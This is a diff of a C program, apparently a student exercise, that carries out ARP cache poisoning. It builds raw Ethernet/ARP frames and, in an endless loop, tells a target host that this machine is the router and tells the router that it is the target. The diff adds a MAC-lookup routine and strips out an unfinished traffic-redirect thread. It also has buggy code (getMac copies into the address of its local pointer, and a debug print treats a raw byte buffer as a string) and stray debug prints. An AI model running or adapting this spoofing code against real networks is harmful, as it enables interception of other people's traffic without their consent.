@@ -17,7 +17,7 @@
 #define BUFFER_SIZE 1600
 #define MAX_DATA_SIZE 1500
 #define ARP_HDRLEN 28
-#define IF_DEBUG 1
+#define IF_DEBUG 0
 
 #define INT_TO_ADDR(_addr) \
 (_addr & 0xFF), \
@@ -227,74 +227,182 @@ void getmactarget(char *ip,int find_router){
 	
 }
 
-void * redirect(void *args)
-{
-	//clear arp table
-	//FILE *pFile;
-	//pFile = fopen("arp_table.txt", "w");
-	//fclose(pFile);
+int getMac(char * ip, uint8_t * mac){
+	int fd;
+	struct ifreq if_idx;
+	struct ifreq if_mac;
+	struct sockaddr_ll socket_address;
+	int frame_len = 0;
 	char buffer[BUFFER_SIZE];
+	char dest_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //broadcast
+	short int ethertype = htons(0x0806);
 
-	printf("Listening packets...\n");
-	while (1) {
+	arp_hdr arphdr;
+
+	/* Cria um descritor de socket do tipo RAW */
+	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
+		perror("socket");
+		exit(1);
+	}
+
+	/* Obtem o indice da interface de rede */
+	memset(&if_idx, 0, sizeof (struct ifreq));
+	strncpy(if_idx.ifr_name, ifname, IFNAMSIZ - 1);
+	if (ioctl(fd, SIOCGIFINDEX, &if_idx) < 0) {
+		perror("SIOCGIFINDEX");
+		exit(1);
+	}
+
+
+	/* Obtem o endereco MAC da interface local */
+	memset(&if_mac, 0, sizeof (struct ifreq));
+	strncpy(if_mac.ifr_name, ifname, IFNAMSIZ - 1);
+	if (ioctl(fd, SIOCGIFHWADDR, &if_mac) < 0) {
+		perror("SIOCGIFHWADDR");
+		exit(1);
+	}
+
+	/* Indice da interface de rede */
+	socket_address.sll_ifindex = if_idx.ifr_ifindex;
+
+	/* Tamanho do endereco (ETH_ALEN = 6) */
+	socket_address.sll_halen = ETH_ALEN;
+
+	/* Endereco MAC de destino */
+	memcpy(socket_address.sll_addr, dest_mac, MAC_ADDR_LEN);
+
+	/* Preenche o buffer com 0s */
+	memset(buffer, 0, BUFFER_SIZE);
+
+	/* Monta o cabecalho Ethernet */
+
+	/* Preenche o campo de endereco MAC de destino */	
+	memcpy(buffer, dest_mac, MAC_ADDR_LEN);
+	frame_len += MAC_ADDR_LEN;
+
+	/* Preenche o campo de endereco MAC de origem */
+	memcpy(buffer + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
+	frame_len += MAC_ADDR_LEN;
+
+	/* Preenche o campo EtherType */
+	memcpy(buffer + frame_len, &ethertype, sizeof(ethertype));
+	frame_len += sizeof(ethertype);
+
+	/* Monta o cabecalho ARP */
+
+	/* Hardware type (16 bits): 1 for ethernet */
+	arphdr.htype = htons (1);
+
+	/* Protocol type (16 bits): 2048 for IP */
+	arphdr.ptype = htons (ETH_P_IP);
+
+	/* Hardware address length (8 bits): 6 bytes for MAC address */
+	arphdr.hlen = 6;
+
+	/* Protocol address length (8 bits): 4 bytes for IPv4 address */
+	arphdr.plen = 4;
+
+	/* OpCode: 1 for ARP request */
+	arphdr.opcode = htons (1);
+
+	/* Sender hardware address (48 bits): MAC address */
+	
+	// if(if_mac.ifr_hwaddr.sa_data[3] > 0xffffff00){
+	// 	printf("tretta mac: %.02x\n", if_mac.ifr_hwaddr.sa_data[3] % 0xffffff00);
+	// 	if_mac.ifr_hwaddr.sa_data[3] = if_mac.ifr_hwaddr.sa_data[3] % 0xffffff00;
+	// }
+	// printf("now mac: %.02x\n", if_mac.ifr_hwaddr.sa_data[3]);
+
+	memcpy (&arphdr.sender_mac, if_mac.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
+	/* Target hardware address (48 bits): zero, since we don't know it yet. */
+	memset (&arphdr.target_mac, 0, 6 * sizeof (uint8_t));
+	
+	// help vars for multiple sends
+	char sender_ip[15];
+	char target_ip[15];
+
+
+	inet_pton (AF_INET, sender_ip, &arphdr.sender_ip);
+
+
+	inet_pton (AF_INET, ip, &arphdr.target_ip);
+
+	memcpy (buffer + frame_len, &arphdr, ARP_HDRLEN * sizeof (uint8_t));
+	frame_len += ARP_HDRLEN;
+
+	// Envia pacote 
+	if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
+		perror("send");
+		close(fd);
+		exit(1);
+	}
+
+	if(IF_DEBUG){
+		printf("Broadcast\tARP\tWho has %s? Tell %s\n", target_ip, sender_ip);
+	}
+
+	printf("IP AQUI %s, MAC %s",ip, mac);
+
 		unsigned char mac_dst[6];
 		unsigned char mac_src[6];
 		//unsigned char *arp;
 		short int e_type;
+		unsigned char ip_sd[4];
+        short op_code;
 		char sender_mac[17];
-		char destination_ip[15];
-		unsigned char dest_ip[4];
-        int fd;
-        if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
-	        perror("socket");
-	        exit(1);
-        }		
 
-		/* Recebe pacotes */
-		if (recv(fd,(char *) &buffer, BUFFER_SIZE, 0) < 0) {
-			perror("recv");
-			close(fd);
-			exit(1);
-		}
-        
-		/* Copia o conteudo do cabecalho Ethernet */
-		memcpy(mac_dst, buffer, sizeof(mac_dst));
-		memcpy(mac_src, buffer+sizeof(mac_dst), sizeof(mac_src));
-		memcpy(&e_type, buffer+sizeof(mac_dst)+sizeof(mac_src), sizeof(e_type));
-
-		// tenta capturar ip
-		memcpy(dest_ip, buffer+sizeof(mac_dst)+sizeof(mac_src)+(16*sizeof(char)), sizeof(dest_ip));
-		e_type = ntohs(e_type);
+		int received = 0;
 
 
-		// verifica header ip
-		if(e_type == htons(0x0800)){		
 
-			printf("\n--- Received:\n");
-			printf("IP destino: %d.%d.%d.%d\n", 
-						dest_ip[0], dest_ip[1], dest_ip[2], dest_ip[3]);
-			printf("MAC destino: %02x:%02x:%02x:%02x:%02x:%02x\n", 
-						mac_dst[0], mac_dst[1], mac_dst[2], mac_dst[3], mac_dst[4], mac_dst[5]);
+		while(recv(fd,(char *) &buffer, BUFFER_SIZE, 0) > 0 && received == 0){
 
-			memset(sender_mac, 0, sizeof(sender_mac));
-			sprintf(sender_mac, " %02x:%02x:%02x:%02x:%02x:%02x", mac_src[0], mac_src[1], mac_src[2], mac_src[3], mac_src[4], mac_src[5]);
-			printf("MAC origem:  %s\n", sender_mac);
+			/* Copia o conteudo do cabecalho Ethernet */
+			memcpy(mac_dst, buffer, sizeof(mac_dst));
+			memcpy(mac_src, buffer+sizeof(mac_dst), sizeof(mac_src));
+			memcpy(&e_type, buffer+sizeof(mac_dst)+sizeof(mac_src), sizeof(e_type));
+			e_type = ntohs(e_type);
+			
+			memcpy(ip_sd, buffer+sizeof(mac_dst)+sizeof(mac_src)+(16*sizeof(char)), sizeof(ip_sd));
+    	    memcpy(&op_code, buffer+sizeof(mac_dst)+sizeof(mac_src)+(8*sizeof(char)), sizeof(op_code));
 
-			printf("EtherType: 0x%04x\n", e_type);
-			printf("\n\n");
+			op_code = ntohs(op_code);
+			//if (htons(e_type) == ethertype && op_code == 2) {
+    	     //Retirei o opcode para podermos pegar o IP e endereco MAC do roteador
+    	     if (htons(e_type) == ethertype) {
 
-			// Verify if have to redirect the buffer
-			sprintf(destination_ip, "%d.%d.%d.%d", dest_ip[0], dest_ip[1], dest_ip[2], dest_ip[3]);
-			if(strcmp(target_ip, destination_ip) == 0){
-				// TODO: Redirect the buffer changing mac
+
+    	        //printf("opcode:%d\n", op_code);
+				//printf("MAC destino: %02x:%02x:%02x:%02x:%02x:%02x\n", 
+    	        //            mac_dst[0], mac_dst[1], mac_dst[2], mac_dst[3], mac_dst[4], mac_dst[5]);
+
+				memset(sender_mac, 0, sizeof(sender_mac));
+				sprintf(sender_mac, " %02x:%02x:%02x:%02x:%02x:%02x", mac_src[0], mac_src[1], mac_src[2], mac_src[3], mac_src[4], mac_src[5]);
+				//printf("MAC origem:  %s\n", sender_mac);
+
+				//printf("EtherType: 0x%04x\n", e_type);
+				
+				memset(sender_ip, 0, sizeof(sender_ip));
+				sprintf(sender_ip, "%d.%d.%d.%d", ip_sd[0], ip_sd[1], ip_sd[2], ip_sd[3]);
+				
+
+				if(strcmp(sender_ip,ip) == 0){
+		
+					printf("IP sender: %s\n", sender_ip);
+					printf("MAC sender: %s\n", sender_mac);
+
+					//memcpy(mac, sizeof(char), "%02x:%02x:%02x:%02x:%02x:%02x",  mac_src[0], mac_src[1], mac_src[2], mac_src[3], mac_src[4], mac_src[5]);
+					memcpy(&mac, mac_src, sizeof(mac_src));
+					received = 1;
+					break;
+				}
+		
 			}
-
-			printf("---\n");
 		}
 
-	}
+	close(fd);
 
-    pthread_exit(NULL);
+	return 0;
 }
 
 
@@ -383,9 +491,20 @@ void sendarprouter(){
 	memcpy (&arphdr_router.sender_mac, if_mac.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
 	
 	/* VERIFICAR COM O PROFESSOR, NAO CONSEGUI INFORMAR O MAC DO DESTINATARIO 
-	   Target hardware address destino  */	
-	//memset (&arphdr.target_mac, target_mac, sizeof (target_mac));
-	memset (&arphdr_router.target_mac, 0, 6 * sizeof (uint8_t));
+	   Target hardware address destino  */
+
+	printf("sfsdff %s  \n",sender_ip);
+	getMac(sender_ip,arphdr_router.target_mac);
+
+
+
+	//memset (&arphdr_router.target_mac, target_mac, 6 * sizeof (uint8_t));
+/*
+	uint8_t data[70];    
+	char str[70];
+	sprintf(str,"U,DHT;T,%d;H,%d;I,%d", (int)(ft * 100), (int)(fh * 100), (int)(fi * 100));
+	strcpy(data,(uint8_t*)str);
+*/
 	
 
 	/*==== AQUI ESTA O TOQUE ME VOI ===*/
@@ -413,6 +532,7 @@ void sendarprouter(){
 	memcpy (buffer + frame_len, &arphdr_router, ARP_HDRLEN * sizeof (uint8_t));
 	frame_len += ARP_HDRLEN;
 
+
 	// Envia pacote 
 	if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
 		perror("send");
@@ -432,6 +552,8 @@ void sendarprouter(){
 
 
 void sendarptarget(){
+
+	printf("1112 \n");
 
 	int fd;
 	struct ifreq if_idx;
@@ -470,7 +592,7 @@ void sendarptarget(){
 		exit(1);
 	}
 
-
+	printf("1113 \n");
 	/* =================== INFORMAR O IP QUE SERA SIMULADO ============*/
 	//IP original
 	char sender_ip[15];
@@ -517,7 +639,10 @@ void sendarptarget(){
 	
 	/* VERIFICAR COM O PROFESSOR, NAO CONSEGUI INFORMAR O MAC DO DESTINATARIO  - Target hardware address destino  */	
 	//memset (&arphdr.target_mac, target_mac, sizeof (target_mac));
-	memset (&arphdr.target_mac, 0, 6 * sizeof (uint8_t));
+	
+	getMac(sender_ip, arphdr.target_mac);
+
+	//memcpy (&arphdr.target_mac, target_mac, sizeof (target_mac));	
 	
 	//salva o ip do roteador como se ele tivesse enviado
 	inet_pton (AF_INET, sender_ip, &arphdr.sender_ip);
@@ -542,12 +667,14 @@ void sendarptarget(){
 	memcpy (buffer + frame_len, &arphdr, ARP_HDRLEN * sizeof (uint8_t));
 	frame_len += ARP_HDRLEN;
 
+	printf("1114\n");
 	// Envia pacote 
 	if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
 		perror("send");
 		close(fd);
 		exit(1);
 	}
+
 
 	if(IF_DEBUG){
 			printf("***********TARGET********** \n");
@@ -560,18 +687,22 @@ void sendarptarget(){
 }
 
 
-void * poisoning(void *args){
+void  poisoning(){
 
 	while(1){
-
+		printf("01 \n");
 		//Envia meu endereco mac para o target informando que sou o router
 		sendarptarget();
+
+		sleep(2);
+
+		printf("02 \n");
 		//Envia para o router meu endereco mac informando que sou o target
 		sendarprouter();		
-		sleep(2);
-	}
 	
-    pthread_exit(NULL);
+	}
+			printf("03\n");
+    //pthread_exit(NULL);
 }
 
 
@@ -584,19 +715,20 @@ int main(int argc, char *argv[])
 	strcpy(ifname, argv[1]);
 	strcpy(target_ip, argv[2]);
 
-    pthread_t thread_redirect;
-    pthread_t thread_poisoning;
-
+    //pthread_t thread_redirect;
+    //pthread_t thread_poisoning;
+    poisoning();
+/*
     if (pthread_create(&thread_redirect, NULL, redirect, NULL) != 0) {
 	    printf("Erro ao criar a thread.\n");
 	    exit(-1);
     }
-
-	if (pthread_create(&thread_poisoning, NULL, poisoning, NULL) != 0) {
+*/
+	//if (pthread_create(&thread_poisoning, NULL, poisoning, NULL) != 0) {
 		printf("Erro ao criar a thread.\n");
 		exit(-1);
-	}
-    pthread_exit(NULL);
+	//}
+   // pthread_exit(NULL);
 }
 
 
